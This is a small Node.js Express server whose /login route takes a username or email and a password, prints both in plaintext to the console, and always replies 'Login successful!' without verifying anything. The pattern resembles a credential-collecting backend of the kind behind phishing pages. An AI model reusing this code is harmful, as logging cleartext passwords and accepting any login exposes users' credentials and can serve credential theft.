const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML file directly from the root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle form submission
app.post('/login', (req, res) => {
  const emailOrUsername = req.body.email_or_username;
  const password = req.body.password;

  // Simulate sending user data (e.g., save to database)
  kirimData(emailOrUsername, password);

  // Send a JSON response with a success message
  res.json({ message: 'Login successful!' });
});

// Function to simulate sending user data
function kirimData(emailOrUsername, password) {
  // Logic for processing user data
  console.log(`Data User: Email or Username - ${emailOrUsername}, Password - ${password}`);
}

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
